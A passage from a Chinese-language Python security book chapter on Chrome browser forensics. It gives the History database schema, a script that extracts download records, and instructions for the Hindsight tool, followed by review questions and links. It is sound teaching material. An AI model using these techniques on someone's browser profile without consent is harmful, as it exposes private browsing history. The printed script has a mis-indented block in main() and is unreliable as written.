+   **downloads:** `id`, `current_path`, `target_path`, `start_time`, `received_bytes`, `total_bytes`, `state`, `danger_type`, `interrupt_reason`, `end_time`, `opened`, `referrer`, `by_ext_id`, `by_ext_name`, `etag`, `last_modified`, `mime_type`, `original_mime_type`

+   **downloads_url_chains**: `id`, `chain_index`, `url`

+   **keyword_search_terms:** `keyword_id`, `url_id`, `lower_term`, `term`

+   **meta:** `key`, `value`

+   **segment_usage:**  `id`, `segment_id`, `time_slot`, `visit_count`

+   **segments:** `id`, `name`, `url_id`

+   **urls:** `id`, `url`, `title`, `visit_count`, `typed_count`, `last_visit_time`, `hidden`, `favicon_id`

在这张图片中，我们可以看到一个 SQlite 浏览器的截图，显示了历史数据库中可用的表：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/adc00515-d4fc-4183-aa0e-2c22b59573a4.png)

Chrome 将其数据本地存储在一个`SQLite 数据库`中。因此，我们只需要编写一个 Python 脚本，该脚本将连接到数据库，查询必要的字段，并从表中提取数据。

我们可以编写一个 Python 脚本，从下载表中提取信息。您只需要**`导入 sqlite3`**模块，该模块随 Python 安装而来。

您可以在与 Python3.x 兼容的`ChromeDownloads.py`文件中找到以下代码：

```py
import sqlite3
import datetime
import optparse

def fixDate(timestamp):
    #Chrome stores timestamps in the number of microseconds since Jan 1 1601.
    #To convert, we create a datetime object for Jan 1 1601...
    epoch_start = datetime.datetime(1601,1,1)
    #create an object for the number of microseconds in the timestamp
    delta = datetime.timedelta(microseconds=int(timestamp))
    #and return the sum of the two.
    return epoch_start + delta

selectFromDownloads = 'SELECT target_path, referrer, start_time, end_time, received_bytes FROM downloads;'

def getMetadataHistoryFile(locationHistoryFile):
    sql_connect = sqlite3.connect(locationHistoryFile)
    for row in sql_connect.execute(selectFromDownloads):
        print ("Download:",row[0].encode('utf-8'))
        print ("\tFrom:",str(row[1]))
        print ("\tStarted:",str(fixDate(row[2])))
        print ("\tFinished:",str(fixDate(row[3])))
        print ("\tSize:",str(row[4]))

def main():
    parser = optparse.OptionParser('-location <target location>')
    parser.add_option('-l', dest='location', type='string', help='specify url address')

    (options, args) = parser.parse_args()
     location = options.location
     print(location)
     if location == None:
         exit(0)
     else:
         getMetadataHistoryFile(location)

if __name__ == '__main__':
    main()
```

我们可以看到提供脚本使用`-h`参数的选项：

`python .\ChromeDownloads.py -h`

要执行前面的脚本，我们需要传递一个参数，即您的历史文件数据库的位置：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/26627db3-b833-4216-814a-422676282c04.png)

# 使用 Hindsight 进行 Chrome 取证

Hindsight 是一个用于解析用户 Chrome 浏览器数据的开源工具，允许您分析多种不同类型的 Web 工件，包括 URL、下载历史、缓存记录、书签、偏好设置、浏览器扩展、HTTP cookie 和以 cookie 形式的本地存储日志。

该工具可以在 GitHub 和 pip 存储库中找到：

[`github.com/obsidianforensics/hindsight`](https://github.com/obsidianforensics/hindsight)

[`pypi.org/project/pyhindsight/`](https://pypi.org/project/pyhindsight/)

在这个截图中，我们可以看到这个模块的最新版本：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/d756ebc5-251d-4a2f-814c-fd736f30110a.png)

我们可以使用`pip install pyhindsight`命令进行安装。

安装了模块后，我们可以从 GitHub 存储库下载源代码：

[`github.com/obsidianforensics/hindsight`](https://github.com/obsidianforensics/hindsight)

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/a5bb0376-8c43-4192-a408-20ec966dec2b.png)

我们可以以两种方式执行它。第一种是使用`hindsight.py`脚本，第二种是通过启动`hindsight_gui.py`脚本，它提供了一个用于输入 Chrome 配置文件位置的 Web 界面。

对于使用`hindsight.py`执行，我们只需要传递一个强制参数(**`-i`,**`--input`)，即您的 Chrome 配置文件的位置，具体取决于您的操作系统：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/99747764-86a9-46c2-a70e-e9069eefbfe9.png)

这些是我们需要了解的 Chrome 配置文件的默认位置，以设置输入参数：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/a369573f-47a5-45f5-89dc-8279e084dd7f.png)

第二种方法是运行“`hindsight_gui.py`”并在浏览器中访问[`localhost:8080`](http://localhost:8080)：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/34b8947b-9ba6-4b35-bc92-289def323701.png)

唯一强制性的字段是配置文件路径：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/de7e2530-62f9-4383-be72-4ad4c5e50beb.png)

如果我们尝试在打开 Chrome 浏览器进程的情况下运行脚本，它将阻止该进程，因为我们需要在运行之前关闭 Chrome 浏览器。

这是当您尝试执行脚本时，chrome 进程正在运行时的错误消息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/b10ab9d9-ab8e-43d6-a1d4-80bdf11bd1bb.png)

# 总结

本章的目标之一是了解允许我们从文档和图像中提取元数据的模块，以及从 IP 地址和域名中提取地理位置信息的模块。我们讨论了如何获取域名信息，例如特定网页中使用的技术和 CMS。最后，我们回顾了如何从 Chrome 和 Firefox 等网络浏览器中提取元数据。本章中审查的所有工具都允许我们获取可能对我们的渗透测试或审计过程的后续阶段有用的信息。

在下一章节中，我们将探讨用于实现加密和隐写术的编程包和 Python 模块。

# 问题

1.  Python 中哪个模块允许我们从 IP 地址检索地理信息？

1.  哪个模块使用 Google Geocoding API v3 服务来检索特定地址的坐标？

1.  `Pygeocoder`模块的主要类是什么，它允许从地点描述和特定位置进行查询？

1.  哪种方法允许反向过程从对应于纬度和经度的坐标中恢复所述站点的地址？

1.  `pygeoip`模块中的哪个方法允许我们从传递的 IP 地址获取国家名称的值？

1.  `pygeoip`模块中的哪个方法允许我们从 IP 地址获取地理数据（国家、城市、地区、纬度、经度）的字典形式的结构？

1.  `pygeoip`模块中的哪个方法允许我们从域名获取组织的名称？

1.  哪个 Python 模块允许我们从 PDF 文档中提取元数据？

1.  我们可以使用哪个类和方法来获取 PDF 文档的信息？

1.  哪个模块允许我们从 EXIF 标签中提取图像信息？

# 进一步阅读

在这些链接中，您将找到有关本章中提到的工具及其官方文档的更多信息：

+   [`bitbucket.org/xster/pygeocoder/wiki/Home`](https://bitbucket.org/xster/pygeocoder/wiki/Home)

+   [`chrisalbon.com/python/data_wrangling/geocoding_and_reverse_geocoding/`](https://chrisalbon.com/python/data_wrangling/geocoding_and_reverse_geocoding/)

+   [`pythonhosted.org/PyPDF2`](https://pythonhosted.org/PyPDF2)

+   [`www.dumpzilla.org`](http://www.dumpzilla.org)

+   [`tools.kali.org/forensics/dumpzilla`](https://tools.kali.org/forensics/dumpzilla)

+   [`forensicswiki.org/wiki/Google_Chrome`](http://forensicswiki.org/wiki/Google_Chrome)

+   [`sourceforge.net/projects/chromensics`](https://sourceforge.net/projects/chromensics)
